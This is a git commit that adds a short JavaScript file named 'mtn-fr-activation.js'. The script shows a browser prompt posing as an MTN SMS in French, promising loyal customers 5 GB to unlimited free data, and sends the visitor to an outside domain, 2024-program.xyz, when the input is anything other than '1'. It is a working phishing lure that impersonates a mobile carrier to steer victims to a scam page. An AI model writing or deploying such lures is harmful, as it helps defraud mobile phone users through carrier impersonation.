15417f5495f2b90d0e909ad53522339d6a7bf80c
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-05-29 11:52:28 -0700

    Create mtn-fr-activation.js

---
+++ mtn-fr-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('MTN SMS: Cher client, veuillez vérifier si votre carte SIM MTN est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/mtn-french.html';
+}
